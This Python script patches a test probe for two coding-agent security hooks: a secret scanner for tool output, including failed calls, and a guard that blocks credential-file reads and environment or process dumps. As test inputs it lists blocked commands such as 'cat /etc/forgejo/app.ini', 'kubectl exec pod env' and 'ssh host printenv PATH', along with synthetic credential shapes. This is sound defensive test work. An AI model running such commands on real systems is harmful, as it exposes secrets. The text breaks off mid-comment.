#!/usr/bin/env python3
"""patch_probe_v6.py -- build the probe of the current Spec text from the previous probe, by anchored, asserting edits.

usage: python3 patch_probe_v6.py <previous baseline_probe.py> <out baseline_probe.py>

Every edit asserts that its anchor occurs the expected number of times (a moved or edited anchor stops the run).  The edits are grouped by topic (infrastructure, then one block per
Success Criterion); each topic lists the finding it answers in the repair report.
Rule #7: this file holds no credential-shaped literal."""
import sys

src_path, out_path = sys.argv[1], sys.argv[2]
t = open(src_path, encoding="utf-8").read()


def sub1(old, new, count=1):
    global t
    n = t.count(old)
    assert n == count, f"anchor count {n} != {count}: {old[:110]!r}"
    t = t.replace(old, new)


def after(anchor, add, count=1):
    """insert `add` right after the (unique) anchor text"""
    sub1(anchor, anchor + add, count)


# ======================================================================================================== infrastructure
# docstring: acceptance mode exit codes; a row that raises
sub1('''    WPA_REQUIRE_ALL=1                               acceptance mode: exit 3 when any row that should have run is `n/a`
                                                    (a missing leg, the unreadable-file case under root, a missing hash tool, an unavailable second locale).
    The two shape lines at the end name every `n/a` row; a target shape is only `holds` when every row ran and is `yes`.''',
     '''    WPA_REQUIRE_ALL=1                               acceptance mode (run it on the target tree): exit 4 when the target shape does not hold (some row is `no`),
                                                    else exit 3 when any row that should have run is `n/a` (a missing leg, the unreadable-file case under root,
                                                    a missing hash tool, an unavailable second locale), else exit 0.  Without it the exit code is 0 (the table is the result).
    The two shape lines at the end name every `n/a` row; a target shape is only `holds` when every row ran and is `yes`.
    A row whose job raises (a hook run past its 300 s timeout, an unexpected error) is recorded as `no` with `error: <ExceptionClass>`; the other rows still run.''')

# the version-relative words in row descriptions and comments (the file is read after the revision it was written in has gone)
sub1("    # first-character / shape variants (v2): the default generators never start with / $ < - _ etc.",
     "    # first-character / shape variants: the default generators never start with / $ < - _ etc.")
sub1("# v3: members and boundaries of every retained whitelist branch, and of the removed ones (all deterministic in shape: the",
     "# members and boundaries of every retained whitelist branch, and of the dropped classes (all deterministic in shape: the")
sub1("# 22bp: the pid positions added in v4 -- `$$` / `$!` and `thread-self`", "# 22bp: further pid positions -- `$$` / `$!` and `thread-self`")
sub1('"pid positions of the /proc rows, v4 additions: `$$`, `$!`, `thread-self`,', '"further pid positions of the /proc rows: `$$`, `$!`, `thread-self`,')

# a row job that raises is one red row, not a crashed probe
sub1('''def row(sc, cid, cat, desc, expected, job, hook=False):''',
     '''def _safe(job):
    """run one row job; an exception (a hook run past its 300 s timeout, an unexpected error) is that row's failure -- the other rows still run"""
    try:
        return job()
    except Exception as e:                                  # noqa: BLE001 -- deliberately broad: any failure of a row is a red row
        return (f"error: {type(e).__name__}", False)


def row(sc, cid, cat, desc, expected, job, hook=False):''')
sub1("            case_futs[ex.submit(job)] = i", "            case_futs[ex.submit(_safe, job)] = i")
sub1("        results[i] = (\"not-run\", None) if job is None else job()", "        results[i] = (\"not-run\", None) if job is None else _safe(job)")
sub1("                futs = {ex.submit(r[5]): i for i, r in enumerate(ROWS)\n                        if r[6] and i in results and results[i][1] is not None and want(r[0])}",
     "                futs = {ex.submit(_safe, r[5]): i for i, r in enumerate(ROWS)\n                        if r[6] and i in results and results[i][1] is not None and want(r[0])}")
sub1("                        futs = {ex.submit(r[5]): i for i, r in enumerate(ROWS)\n                                if r[6] and i in results and results[i][1] is not None and want(r[0])}",
     "                        futs = {ex.submit(_safe, r[5]): i for i, r in enumerate(ROWS)\n                                if r[6] and i in results and results[i][1] is not None and want(r[0])}")
sub1("            futs = {ex.submit(r[5]): i for i, r in enumerate(ROWS) if r[6] and i in results and results[i][1] is not None and want(r[0])}",
     "            futs = {ex.submit(_safe, r[5]): i for i, r in enumerate(ROWS) if r[6] and i in results and results[i][1] is not None and want(r[0])}")

# the suites and the census run outside the row pool: a timeout there must not crash the probe either
sub1('''    p = subprocess.run(argv, capture_output=True, env=env, cwd=SUITE_ROOT, timeout=1800)
    out = p.stdout.decode("utf-8", "replace") + "\\n" + p.stderr.decode("utf-8", "replace")''',
     '''    try:
        p = subprocess.run(argv, capture_output=True, env=env, cwd=SUITE_ROOT, timeout=1800)
    except Exception as e:                                  # noqa: BLE001 -- a suite that cannot finish is a red row (its output is unparsable), not a crashed probe
        SUITE[name] = {"rc": 124, "out": f"error: {type(e).__name__}", "scan_lines": 0, "ack_events": 0}
        return
    out = p.stdout.decode("utf-8", "replace") + "\\n" + p.stderr.decode("utf-8", "replace")''')
sub1('''    p = subprocess.run([sys.executable, os.path.join(SUITE_ROOT, "hooks", "tests", "corpus_census.py")], capture_output=True,
                       env=base_env(home, tmpd), cwd=SUITE_ROOT, timeout=900)''',
     '''    try:
        p = subprocess.run([sys.executable, os.path.join(SUITE_ROOT, "hooks", "tests", "corpus_census.py")], capture_output=True,
                           env=base_env(home, tmpd), cwd=SUITE_ROOT, timeout=900)
    except Exception:                                       # noqa: BLE001 -- the census rows read CENSUS and turn red when it stays empty
        return''')

# exit code of the acceptance mode
sub1("    return 3 if (REQUIRE_ALL and missing) else 0\n",
     "    if REQUIRE_ALL:\n        return 4 if not target_shape else (3 if missing else 0)\n    return 0\n")

# ======================================================================================================== L3 rows
# envelope shapes of the failure event (PostToolUseFailure: no tool_response, the call's text in `error`) and success envelopes that carry hook_event_name
sub1('''    raise ValueError(shape)

SYS_RE''', '''    if shape == "bash_failure":
        return {"session_id": "s0", "hook_event_name": "PostToolUseFailure", "tool_name": "Bash", "tool_input": {"command": "false"}, "tool_use_id": "toolu_f0",
                "error": c, "is_interrupt": False, "duration_ms": 12}
    if shape in ("bash_real_ev", "write_real_ev"):
        e = envelope(shape[:-3], c, path)
        e.update({"session_id": "s0", "hook_event_name": "PostToolUse", "tool_use_id": "toolu_s0", "duration_ms": 5})
        return e
    raise ValueError(shape)

SYS_RE''')

# SC-3 3b: the string-form tool_response is not a failure form
sub1('''l3("SC-3", "3b", "known-limit", "Bash tool_response as bare string: error: AWS_ACCESS_KEY_ID=<AKIA+16>",''',
     '''l3("SC-3", "3b", "known-limit", "Bash tool_response as a bare string (no harness sample shows this shape on PostToolUse; a failed call is a PostToolUseFailure input, SC-35): error: AWS_ACCESS_KEY_ID=<AKIA+16>",''')

# SC-9 9z: the left boundary of kv-secret-assign is a documented false-negative class, not a false-positive guard
sub1('''l3m("SC-9", "9z", "allow-guard", "left boundary of kv-secret-assign: a credential key GLUED to a preceding word character is not a key start (a lower-case letter in front of an upper-case key; a lower-case prefix joined to the key by an underscore) -- an implementation without the boundary reads the key out of the middle of the word",
    [("lower-glued", T("x" + "JWT_" + "SECRET=@V0@", "alnum24"), None), ("prefix-glued", T("abc_API_" + "TOKEN=@V0@", "alnum24"), None)])''',
     '''l3m("SC-9", "9z", "known-limit", "KNOWN-LIMIT: the left boundary of kv-secret-assign -- a credential key GLUED to a preceding word character is not a key start (a lower-case letter in front of an upper-case key; a lower-case prefix joined to the key by an underscore, also with `export`, spaces and quotes): the credential-shaped value stays silent; red = somebody widened the boundary (update W2's known limits and open question 31), an implementation without the boundary reads the key out of the middle of the word",
    [("lower-glued", T("x" + "JWT_" + "SECRET=@V0@", "alnum24"), None), ("prefix-glued", T("abc_API_" + "TOKEN=@V0@", "alnum24"), None),
     ("export-prefix-glued-spaced-quoted", T("export my_DB_" + "PASSWORD = '@V0@'", "alnum24"), None)])''')

# SC-12 12p: the fingerprint is taken for COUNTED spans only
after('''l3_custom("SC-12", "12j", "baseline-failing", "the remaining body-extraction forms in one text: gcp key id (quoted 40 hex), postgres URL (password component), X-API-Key header, `Authorization: token`, CF-Access-Client-Secret header, `--token=` flag; fp items = sha256-8 of the BARE values in scan order (gcp, postgres, x-api-key, auth-header-token, cf-access-client-secret, cli-secret-flag)",
          "fp=6 items equal-to-expected", sc12_multi(_six_forms, lambda v: [_sha8(x) for x in v]))
''', '''
def _fp_excluded_spans():
    """11 whitelisted placeholder spans (angle form, 16 characters inside: they pass the length floor, so only the whitelist excludes them) and then ONE real credential, all json:token:
    the fingerprint is taken for the counted span only, so the log holds exactly one item, the real value's hash; a hook that fingerprints a span BEFORE classifying it spends its 10 items on the placeholders"""
    ph = [alnum(16) for _ in range(11)]
    real = alnum(40)
    r = run_scan(envelope(BR, "".join('{"token":"<%s>"}\\n' % p for p in ph) + '{"token":"%s"}\\n' % real))
    fp = _fp_field(r)
    if fp is None:
        return ("no-log-line" if not _log_lines(r) else "fp-field-absent"), False
    ok = r["tags"] == {T_JSON_NEW: 1} and fp == _sha8(real)
    return ("one counted span; fp=[sha256-8 of its value]" if ok else "fp or tags differ"), ok
l3_custom("SC-12", "12p", "baseline-failing", "11 whitelisted placeholder spans (json:token=<16 alnum>, excluded by the whitelist) followed by ONE real json:token value: counted once, and the log's fp field is exactly [sha256-8 of that real value] -- spans the classifier excludes are not fingerprinted",
          "one counted span; fp=[sha256-8 of its value]", _fp_excluded_spans)
''')

# SC-34: more members and sizes (a long run behind a delimiter the value code has to find; long UNQUOTED kv values)
sub1('''LIN_BASE = [   # baseline tags: the detection the baseline has on a long single line must survive the new value-extraction / fingerprint code
    ("bearer-long-value", lambda: "Authorization: " + "Bear" + "er " + _long("aA1", 8000), {"bearer-token": 1}),
    ("x-api-key-long-value", lambda: "X-Api-" + "Key: " + _long("aA1", 8000), {"x-api-key-header": 1}),
    ("env-line-long-value", lambda: "DB_" + "PASSWORD=" + _long("aA1", 8000), {T_ENVLINE: 1}),
    ("env-line-long-key", lambda: "A" * 8000 + "_" + "TO" + "KEN=" + alnum(24), {T_ENVLINE: 1}),
    ("postgres-long-password", lambda: "postgres://u:" + "p" * 8000 + "@h", {"postgres-url": 1}),
    ("postgres-long-user", lambda: "postgres://" + "u" * 8000 + ":" + alnum(8) + "@h", {"postgres-url": 1}),
    ("json-secret-long-value", lambda: '{"' + "pass" + 'word":"' + _long("aA1", 8000) + '"}', {T_JSON_OLD: 1}),
]''', '''BIG = 500000       # a run this long makes a quadratic value extraction burn 8 s or more of CPU in the hook's own bash (4 s cap per process); the linear code needs about 1 s
LIN_BASE = [   # baseline tags: the detection the baseline has on a long single line must survive the new value-extraction / fingerprint code
    ("bearer-long-value", lambda: "Authorization: " + "Bear" + "er " + _long("aA1", 8000), {"bearer-token": 1}),
    ("x-api-key-long-value", lambda: "X-Api-" + "Key: " + _long("aA1", 8000), {"x-api-key-header": 1}),
    ("env-line-long-value", lambda: "DB_" + "PASSWORD=" + _long("aA1", 8000), {T_ENVLINE: 1}),
    ("env-line-long-key", lambda: "A" * BIG + "_" + "TO" + "KEN=" + alnum(24), {T_ENVLINE: 1}),
    ("postgres-long-password", lambda: "postgres://u:" + "p" * BIG + "@h", {"postgres-url": 1}),
    ("postgres-long-user", lambda: "postgres://" + "u" * BIG + ":" + alnum(8) + "@h", {"postgres-url": 1}),
    ("basic-auth-long-password", lambda: "https://u:" + "p" * BIG + "@host", {"basic-auth-url": 1}),
    ("json-secret-long-value", lambda: '{"' + "pass" + 'word":"' + _long("aA1", 8000) + '"}', {T_JSON_OLD: 1}),
    ("json-secret-blank-before-colon", lambda: '{"' + "pass" + 'word"' + " " * BIG + ':"' + alnum(24) + '"}', {T_JSON_OLD: 1}),
]''')
sub1('''    ("kv-upper-run", lambda: "A" * 300000 + " JWT_" + "SECRET=" + alnum(24), {T_KV: 1}),
    ("kv-export-blank-run", lambda: "export" + " " * 8000 + "SVC_" + "TOKEN=" + alnum(24), {T_KV: 1}),''',
     '''    ("kv-upper-run", lambda: "A" * 300000 + " JWT_" + "SECRET=" + alnum(24), {T_KV: 1}),
    ("kv-export-blank-run", lambda: "export" + " " * 100000 + "SVC_" + "TOKEN=" + alnum(24), {T_KV: 1}),
    ("kv-blank-before-delimiter", lambda: "SVC_" + "TOKEN" + " " * BIG + "=" + alnum(24), {T_KV: 1}),
    ("kv-long-unquoted-value-eq", lambda: "SVC_" + "TOKEN = " + _long("aA1", BIG), {T_KV: 1}),
    ("kv-long-unquoted-value-export", lambda: "export SVC_" + "TOKEN=" + _long("aA1", BIG), {T_KV: 1}),
    ("kv-long-unquoted-value-yaml", lambda: "  SVC_" + "TOKEN: " + _long("aA1", BIG), {T_KV: 1}),''')
sub1('''    ("json-blank-run", lambda: '{"' + _TOK + '":"' + " " * 8000 + alnum(24) + '"}', {T_JSON_NEW: 1}),
]''', '''    ("json-blank-run", lambda: '{"' + _TOK + '":"' + " " * 8000 + alnum(24) + '"}', {T_JSON_NEW: 1}),
    ("json-blank-before-colon", lambda: '{"' + _TOK + '"' + " " * BIG + ':"' + alnum(24) + '"}', {T_JSON_NEW: 1}),
]''')
sub1('''row("SC-34", "34a", "reverse-guard", "linear time, baseline tags: a long single line (8 KB values or keys) through the Bash real envelope under a 4 s CPU cap per process still gives the baseline detection -- bearer / X-API-Key header, env-line (long value and long key), postgres URL (long password and long user), json password: 7 shapes",
    "7/7 as expected", _lin_job(LIN_BASE, BR, "l3"))''',
     '''row("SC-34", "34a", "reverse-guard", "linear time, baseline tags: a long single line through the Bash real envelope under a 4 s CPU cap per process still gives the baseline detection -- 8 KB bearer / X-API-Key header values and env-line value; 500 KB env-line key, postgres URL password and user, basic-auth URL password, json password with a 500 KB blank run in front of the colon, and an 8 KB json password value: 9 shapes (the value code runs for every tag, and a delimiter that sits behind a long run must be found by one scan, not by trying positions)",
    "9/9 as expected", _lin_job(LIN_BASE, BR, "l3"))''')
sub1('''row("SC-34", "34b", "baseline-failing", "linear time, new tags: shapes that make a pattern or the value extraction quadratic -- a 300 KB run of `-` and a 20 KB run of `a-` in front of a flag, a long flag value, a 300 KB upper-case run in front of a key, 8 KB blank runs in the export / header / JSON forms, 8 KB header and flag values -- under a 4 s CPU cap per process: the tag is still counted (9 s''',
     '''row("SC-34", "34b", "baseline-failing", "linear time, new tags: shapes that make a pattern or the value extraction quadratic -- a 300 KB run of `-` and a 20 KB run of `a-` in front of a flag, a long flag value, a 300 KB upper-case run in front of a key, blank runs behind `export` (100 KB), in front of the `=` (500 KB) and in front of a JSON colon (500 KB), 500 KB UNQUOTED kv values in the three forms (`KEY = v`, `export KEY=v`, YAML `  KEY: v`), 8 KB blank runs in the header / JSON-value forms, 8 KB header and flag values -- under a 4 s CPU cap per process: the tag is still counted (14 s''')
sub1('''    "9/9 as expected", _lin_job(LIN_NEW, BR, "l3"))''', '''    "14/14 as expected", _lin_job(LIN_NEW, BR, "l3"))''')

# SC-35 -- the failure event
sub1('''# ================================================================ run + print''', '''# ================================================================ SC-35: the failure event
# A failed tool call (a Bash command that exits non-zero, ...) reaches hooks as PostToolUseFailure: no tool_response, the call's text (`Exit code N` + stderr + stdout) in the top-level
# `error`.  The hook is registered for that event too, scans `error` like any other output, and names the event that fired in hookSpecificOutput.hookEventName (the harness rejects a mismatch).
FAIL_PFX = "Exit code 22\\n"
FAIL_CASES = [
    ("aws-key-id-line", lambda: (FAIL_PFX + "AWS_ACCESS_KEY_ID=" + akia(), []), AWS1),
    ("kv-assign-line", T(FAIL_PFX + "JWT_SECRET = @V0@", "b64url43"), {T_KV: 1}),
    ("curl-echoed-auth-header", T(FAIL_PFX + "> Authorization: token @V0@", "hex40"), {T_AUTH: 1}),
]
l3e("SC-35", "35a", "baseline-failing", "failure input (hook_event_name PostToolUseFailure, no tool_response, text in `error` after `Exit code 22`): a credential line is scanned and counted -- an AWS key id line, `JWT_SECRET = <43 b64url>`, a curl -v echoed `> Authorization: token <40 hex>`",
    FAIL_CASES, shape="bash_failure")
def _event_of(r):
    return ((r["json"] or {}).get("hookSpecificOutput") or {}).get("hookEventName") or ""
def _event_job(cases, want_event):
    """cases = [(label, builder, shape)]: every run alerts AND hookSpecificOutput.hookEventName equals want_event"""
    def job():
        res = []
        for label, builder, shape in cases:
            content, _v = builder()
            r = run_scan(envelope(shape, content))
            res.append((f"{label}={_event_of(r) or 'silent'}", bool(r["alert"]) and _event_of(r) == want_event))
        n, k = len(res), sum(1 for _l, ok in res if ok)
        return (f"{n}/{n} as expected" if k == n else f"{k}/{n} as expected; got: " + ", ".join(l for l, _ok in res)), k == n
    return job
row("SC-35", "35b", "baseline-failing", "the same three failure inputs: the output's hookSpecificOutput.hookEventName is `PostToolUseFailure` (the event that fired; the harness rejects `PostToolUse` there and the alert never reaches the model)",
    "3/3 as expected", _event_job([(lab, b, "bash_failure") for lab, b, _w in FAIL_CASES], "PostToolUseFailure"), hook=True)
row("SC-35", "35c", "reverse-guard", "successful calls keep `PostToolUse` as the output event: Bash / Write real envelopes that carry hook_event_name, a legacy envelope without the field, and a success envelope whose TEXT merely mentions `\\"hook_event_name\\":\\"PostToolUseFailure\\"` next to a credential line",
    "4/4 as expected", _event_job([("bash-real", AWS_LINE, "bash_real_ev"), ("write-real", AWS_LINE, "write_real_ev"), ("legacy-no-event-field", AWS_LINE, "bash_legacy"),
                                   ("text-mentions-the-failure-event", lambda: ('hook_event_name":"PostToolUseFailure" AWS_ACCESS_KEY_ID=' + akia(), []), "bash_real_ev")], "PostToolUse"), hook=True)
def _hooks_json_failure():
    try:
        j = json.load(open(os.path.join(ARIA, "hooks", "hooks.json"), encoding="utf-8"))
    except Exception:
        return "hooks.json-unreadable", False
    hk = j.get("hooks") or {}
    ref = [e for e in (hk.get("PostToolUse") or []) for h in e.get("hooks", []) if str(h.get("command", "")).endswith("hooks/secret-scan.sh")]
    fail = hk.get("PostToolUseFailure")
    if not ref:
        return "no-PostToolUse-secret-scan-entry", False
    cmds = [h.get("command") for h in ref[0].get("hooks", []) if str(h.get("command", "")).endswith("hooks/secret-scan.sh")]
    ok = (isinstance(fail, list) and len(fail) == 1 and fail[0].get("matcher") == ref[0].get("matcher") and len(fail[0].get("hooks", [])) == 1
          and [h.get("command") for h in fail[0]["hooks"]] == cmds and [h.get("timeout") for h in fail[0]["hooks"]] == [h.get("timeout") for h in ref[0]["hooks"] if h.get("command") in cmds])
    return ("one secret-scan entry, same matcher as PostToolUse's" if ok else "PostToolUseFailure registration missing or different"), ok
row("SC-35", "35d", "baseline-failing", "hooks/hooks.json registers secret-scan.sh under PostToolUseFailure exactly once, with the same matcher, command and timeout as its PostToolUse entry, and registers nothing else for that event",
    "one secret-scan entry, same matcher as PostToolUse's", _hooks_json_failure)
l3e("SC-35", "35e", "allow-guard", "failure inputs that hold no credential stay silent: an ordinary `Exit code 1` error text, a usage message, and two documented placeholders that the classifier keeps silent on every other output (a `FAKE_` assignment value, a `PLACEHOLDER_` header token)",
    [("ordinary-error", lambda: ("Exit code 1\\nls: cannot access 'x': No such file or directory", []), None), ("usage-message", lambda: ("Exit code 2\\nusage: tool [options] <file>", []), None),
     ("fake-assignment-value", lambda: ("Exit code 1\\nset " + "JWT_" + "SECRET = FAKE_EXAMPLE_VALUE_1234567890 first", []), None),
     ("placeholder-header-token", lambda: ("Exit code 22\\n> Authorization: " + "tok" + "en PLACEHOLDER_EXAMPLE_00000000", []), None)], shape="bash_failure")

# ================================================================ run + print''')

# ======================================================================================================== L1 rows
# SC-17 17d: more readers outside the print-reader table (they read dotenv files, which the baseline blocks, and app.ini, which stays allowed)
sub1('''("bat", "bat /etc/forgejo/app.ini"),''',
     '''("bat", "bat /etc/forgejo/app.ini"), ("expand", "expand /etc/forgejo/app.ini"), ("unexpand", "unexpand /etc/forgejo/app.ini"), ("shuf", "shuf /etc/forgejo/app.ini"),
             ("split", "split -l 1 /etc/forgejo/app.ini /tmp/x_"), ("csplit", "csplit /etc/forgejo/app.ini 1"),''')
sub1("git show, a reader not in the table, an upper-case directory name, a backslash path", "git show, readers not in the table (bat, expand, unexpand, shuf, split, csplit), an upper-case directory name, a backslash path")

# SC-19 19an / 19ao / 19ap: the input faces of the entry file that a natural implementation gets wrong
sub1('''    elif kind == "all_skipped":\n''', '''    elif kind == "nonl_one":
        open(f, "wb").write(P.encode())                                                  # ONE entry and no line feed at all after it
    elif kind == "nonl_two":
        open(f, "wb").write(("/srv/first/one.conf\\n" + P).encode())                      # two entries, the LAST one without a line feed
    elif kind == "all_skipped":\n''')
sub1('''"ws", "cjk", "bom", "fold", "canary", "comment_only", "blank_only", "all_skipped")}''', '''"ws", "cjk", "bom", "fold", "canary", "comment_only", "blank_only", "all_skipped", "nonl_one", "nonl_two")}
PROJ["space"] = mkproj("my project (copy) \\u914d\\u7f6e", "ok")                         # a project root holding blanks, parentheses and non-ASCII characters''')
sub1('''# SC-20 -- extension failure only drops the extension (bad files, bad entries, faulty extension code, evaluation order)''',
     '''# 19an -- the last line of the entry file is an entry even without its line feed (a file written by `printf '%s'` or an editor that does not add one)
def _multi_proj(items):
    """items = [(project key, tool, payload, want exit)]: one hook run each, every one with its own CLAUDE_PROJECT_DIR"""
    def job():
        rcs = [run_guard(tl, c, env_proj(k))[0] for k, tl, c, _w in items]
        return "exit=" + ",".join(str(x) for x in rcs), all(rc == w for rc, (_k, _tl, _c, w) in zip(rcs, items))
    return job
_N19AN = [("nonl_one", "Bash", "cat " + P, 2), ("nonl_two", "Bash", "cat " + P, 2), ("nonl_two", "Bash", "cat /srv/first/one.conf", 2)]
row("SC-19", "19an", "baseline-failing", "[CLAUDE_PROJECT_DIR=proj(nonl_one): the file holds ONE entry and no line feed; proj(nonl_two): two entries, the second without a line feed] a last line without a trailing newline is an entry: cat P (2) ; cat P (2) ; cat <first entry> (2)",
    "exit=2,2,2", _multi_proj(_N19AN), hook=True)
# 19ao -- the project root is any string: blanks, parentheses, non-ASCII characters
row("SC-19", "19ao", "baseline-failing", "[CLAUDE_PROJECT_DIR=<a root whose name holds blanks, parentheses and non-ASCII characters>, the file lists P] the entry file is found and read: cat P (2) ; Read P (2)",
    "exit=2,2", _multi_proj([("space", "Bash", "cat " + P, 2), ("space", "Read", P, 2)]), hook=True)
# 19ap -- CLAUDE_PROJECT_DIR set but EMPTY is not a root: the stdin cwd is used
l1("SC-19", "19ap", "baseline-failing", "cat " + P, 2, desc="[CLAUDE_PROJECT_DIR set but empty; stdin cwd=proj(ok)] cat " + P + " (an empty value falls back to the stdin cwd)",
   env_extra={"CLAUDE_PROJECT_DIR": ""}, cwd_field=lambda: PROJ["ok"])

# SC-20 -- extension failure only drops the extension (bad files, bad entries, faulty extension code, evaluation order)''')

# SC-22: the dump alternative of the wrappers (Z), and the W11 spellings and positions (AA)
sub1('''l1e("SC-22", "22bo", "baseline-failing", "env / printenv dumps under every remote / shell wrapper of the wrapper set (ssh, docker exec, docker compose exec, podman exec, kubectl exec, lxc exec, nomad alloc exec, pct exec, sh -c, bash -c, watch) x {env, printenv}: 22 members, each blocked",
    [(f"{w}:{d}", t.replace("CMD", d)) for w, t in WRAP_T_ENV for d in ("env", "printenv")], 2)''',
     '''# The wrappers that have a baseline row of their own (docker / docker compose exec: secret-guard.sh:858, kubectl exec: :862-863, podman exec: :938, lxc exec: :940) are spelled here so that THAT row does not block
# the dump (a quoted dump; no `--` behind lxc), otherwise a rule that lacks the wrapper would stay green on the baseline's own coverage.
WRAP_NB = {"docker": 'docker exec c "CMD"', "docker-compose": 'docker compose exec web "CMD"', "podman": 'podman exec c "CMD"', "kubectl": "kubectl exec pod 'CMD'", "lxc": "lxc exec c CMD"}
WRAP_T_ENV_NB = [(w, WRAP_NB.get(w, t)) for w, t in WRAP_T_ENV]
l1e("SC-22", "22bo", "baseline-failing", "env / printenv dumps under every remote / shell wrapper of the wrapper set (ssh, docker exec, docker compose exec, podman exec, kubectl exec, lxc exec, nomad alloc exec, pct exec, sh -c, bash -c, watch) x {env, printenv}: 22 members, each blocked; the five wrappers that have a baseline row of their own are spelled so that the baseline row does not block them (a quoted dump behind docker / docker compose / podman / kubectl, no `--` behind lxc)",
    [(f"{w}:{d}", t.replace("CMD", d)) for w, t in WRAP_T_ENV_NB for d in ("env", "printenv")], 2)
l1e("SC-22", "22bw", "reverse-guard", "the baseline's own spellings stay blocked: docker / docker compose / podman exec <c> env|printenv, kubectl exec <pod> -- env|printenv, lxc exec <c> -- env|printenv (10 members; secret-guard.sh:858 / :862-863 / :938 / :940)",
    [(f"{w}:{d}", t.replace("CMD", d)) for w, t in WRAP_T_ENV if w in ("docker", "docker-compose", "podman", "kubectl", "lxc") for d in ("env", "printenv")], 2)
PRINTENV_NAME = [("ssh", "ssh host printenv PATH"), ("docker", "docker exec c printenv HOME"), ("docker-compose", "docker compose exec web printenv NODE_ENV"), ("podman", "podman exec c 'printenv HOME'"),
                 ("kubectl", "kubectl exec pod 'printenv HOSTNAME'"), ("lxc", "lxc exec c printenv HOME"), ("nomad", "nomad alloc exec abc printenv HOME"), ("pct", "pct exec 101 -- printenv HOME"),
                 ("sh-c", "sh -c 'printenv HOME'"), ("bash-c", 'bash -c "printenv LANG"'), ("watch", "watch printenv X")]
l1e("SC-22", "22bx", "baseline-failing", "a single-variable read `printenv <NAME>` under each of the 11 wrappers is blocked, like the direct `printenv <NAME>` (secret-guard.sh:867 blocks it at command position): 11 members, spelled so that no baseline wrapper row blocks them",
    PRINTENV_NAME, 2)
l1e("SC-22", "22by", "baseline-failing", "a dump behind kubectl exec (no `--`) spelled as a command substitution or with an output redirect is blocked: `x=$(kubectl exec pod env)`, `kubectl exec pod env > /tmp/x` (the baseline kubectl rows block a dump only at the end of the line or before a pipe)",
    [("cmd-subst", "x=$(kubectl exec pod env)"), ("redirect", "kubectl exec pod env > /tmp/x")], 2)''')
sub1('''l1m("SC-22", "22O", "allow-guard", ["ps -e", "ps -eo pid,comm",''', '''# 22bt / 22bu / 22bv -- the semantics W11 writes, member by member (a rule written for the canonical spelling only passes every row above and still lets the natural variants through)
CMDPOS = [("semicolon", "true; ps aux"), ("semicolon-whole-string", "true; ps aux &"), ("ampersand", "true & ps aux"), ("pipe", "true | ps aux"), ("paren-open", "(ps aux)"), ("paren-close", "x=$(true) ps aux"), ("brace", "{ ps aux; }"),
          ("back-quote", "echo `ps aux`"), ("newline", "true\\nps aux")]
l1e("SC-22", "22bt", "baseline-failing", "the command-position characters of the process-table rows, one member each: `;` `&` `|` `(` `)` `{` back-quote and a newline in front of `ps aux`, and `;` once more in a command that is judged as a whole string (a trailing `&`: the segment splitter absorbs a plain `;`, so only the whole-string judgement needs the character in the set) (line start, the keyword positions and the launchers are 22az / 22aw)",
    CMDPOS, 2)
SPELL_POS = [("pgrep-fa", "pgrep -fa curl"), ("pgrep-la", "pgrep -la curl"), ("pgrep-ifa", "pgrep -ifa curl"), ("pgrep-a-second-operand", "pgrep -u root -a curl"), ("pgrep-x-af", "pgrep -x -af nginx"),
             ("pstree-pa", "pstree -pa"), ("pstree-ua", "pstree -ua"), ("pstree-a-second-operand", "pstree -p -a"),
             ("ps-eF", "ps -eF"), ("ps-F-first-operand", "ps -F -p 123"), ("ps-f-after-pid", "ps -p 123 -f"), ("ps-F-after-pid", "ps -p 1 -F"),
             ("docker-ps-a-no-trunc", "docker ps -a --no-trunc"), ("docker-container-ls-a-no-trunc", "docker container ls -a --no-trunc"),
             ("launcher-minutes", "timeout 5m ps aux"), ("launcher-hours", "timeout 2h ps -ef"), ("launcher-days", "timeout 1d ps aux"), ("launcher-seconds", "timeout 30s ps aux")]
l1e("SC-22", "22bu", "baseline-failing", "cluster letters and operand positions, one member each: the `a` of pgrep / pstree anywhere in a cluster (`-fa` `-la` `-ifa` `-pa` `-ua`) and in any operand position (`pgrep -u root -a`, `pstree -p -a`); the SysV `-f` / `-F` in a cluster (`-eF`) and in any operand position (`ps -p 123 -f`); `--no-trunc` anywhere behind `ps` / `ls` (`docker ps -a --no-trunc`); launcher durations with each suffix (`5m` `2h` `1d` `30s`)",
    SPELL_POS, 2)
OLIST = [("keyword-first", "ps -eo args,pid"), ("keyword-middle", "ps -eo pid,args,etime"), ("cmd-then-mem", "ps -o cmd,%mem -p 1"), ("two-keywords", "ps -o comm,args -p 1"),
         ("format-cmd-first", "ps --format cmd,pid"), ("format-middle", "ps --format pid,args,etime"), ("o-after-pid", "ps -p 1 -o pid,command")]
l1e("SC-22", "22bv", "baseline-failing", "the `-o` / `--format` list is read anywhere: the keyword args / cmd / command first, in the middle, followed by more columns, with another keyword, behind a pid operand",
    OLIST, 2)
l1m("SC-22", "22O", "allow-guard", ["ps -e", "ps -eo pid,comm",''')

# SC-25 25i: the extension's BLOCKED text names the extension and the original command
after('''    "blocked; `Command was:` shows the original text", _blocked_echoes_original, hook=True)
''', '''def _ext_block_text():
    """the extension's BLOCKED text: `Matched pattern:` names the extension file, `Command was:` / `Triggering segment:` show the ORIGINAL command; the stand-in name the entry is judged under never shows"""
    cmd = "echo hi; cat " + P
    rc, err = run_guard("Bash", cmd, env_proj("ok"))
    lines = err.splitlines()
    pat = [l for l in lines if "Matched pattern: " in l]
    cw = [l for l in lines if l.startswith("Command was: ")]
    ts = [l for l in lines if l.startswith("Triggering segment: ")]
    ok = rc == 2 and bool(pat) and ".aria/secret-guard.paths" in pat[0] and bool(cw) and cw[0] == "Command was: " + cmd and bool(ts) and P in ts[0] and "app.ini" not in err
    return ("names the extension file and the original command" if ok else f"rc={rc}; the stand-in name shows or the original text is missing"), ok
row("SC-25", "25i", "baseline-failing", "[CLAUDE_PROJECT_DIR=proj(ok)] echo hi; cat " + P + ": the extension's BLOCKED text names `.aria/secret-guard.paths` in `Matched pattern:` and echoes the ORIGINAL command in `Command was:` and `Triggering segment:`; the stand-in app.ini name the entry is judged under never shows (25f normalises those lines away)",
    "names the extension file and the original command", _ext_block_text, hook=True)
''')

# SC-30 30b: the existing guard suite's SC-8 assembly finds everything it needs above the sourcing gate
after('''row("SC-30", "30a", "zero-regression", "secret-guard.test.sh on a checkout WITH git history (SC-9a, SC-8 latency gate) -- not run by this probe, see proposal", "n/a", None)
''', '''# 30b replays the assembly of the suite's own SC-8 block (secret-guard.test.sh: `source` the hook -- only the part above the sourcing gate -- then extract risky_patterns, _sg_judge_one and
